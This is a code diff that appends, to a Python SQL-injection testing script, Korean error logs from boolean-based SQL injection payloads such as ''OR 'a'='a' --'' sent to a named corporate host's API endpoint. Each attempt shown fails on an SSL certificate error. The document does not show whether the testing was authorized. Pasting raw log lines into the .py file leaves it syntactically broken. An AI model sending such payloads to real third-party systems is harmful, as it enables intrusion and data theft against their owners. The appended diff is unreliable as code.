@@ -159,3 +159,11 @@ def detect_sql_injection():
 # 프로그램 실행
 if __name__ == "__main__":
     detect_sql_injection()
+
+
+페이로드 테스트 중 오류 발생: HTTPSConnectionPool(host='webveqms.skhynix.com', port=443): Max retries exceeded with url: /api/getFABNotice.do (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate in certificate chain (_ssl.c:1000)')))
+[오류] '' AND '1'='2 -- ' 페이로드 테스트 중 오류 발생: HTTPSConnectionPool(host='webveqms.skhynix.com', port=443): Max retries exceeded with url: /api/getFABNotice.do (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate in certificate chain (_ssl.c:1000)')))
+[오류] 'AND 1=1 --' 페이로드 테스트 중 오류 발생: HTTPSConnectionPool(host='webveqms.skhynix.com', port=443): Max retries exceeded with url: /api/getFABNotice.do (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate in certificate chain (_ssl.c:1000)')))
+[오류] 'AND 1=2 --' 페이로드 테스트 중 오류 발생: HTTPSConnectionPool(host='webveqms.skhynix.com', port=443): Max retries exceeded with url: /api/getFABNotice.do (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate in certificate chain (_ssl.c:1000)')))
+[오류] 'OR 'a'='a' -- ' 페이로드 테스트 중 오류 발생: HTTPSConnectionPool(host='webveqms.skhynix.com', port=443): Max retries exceeded with url: /api/getFABNotice.do (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate in certificate chain (_ssl.c:1000)')))
+[오류] 'OR 'a'='b' -- ' 페이로드 테스트 중 오류 발생: HTTPSConnectionPool(host='webveqms.skhynix.com', port=443): Max retries exceeded with url: /api/getFABNotice.do (Caused by SSLError(SSLCertVerificationError(1, '[SSL: CERTIFICATE_VERIFY_FAILED] certificate verify failed: self-signed certificate in certificate chain (_ssl.c:1000)')))
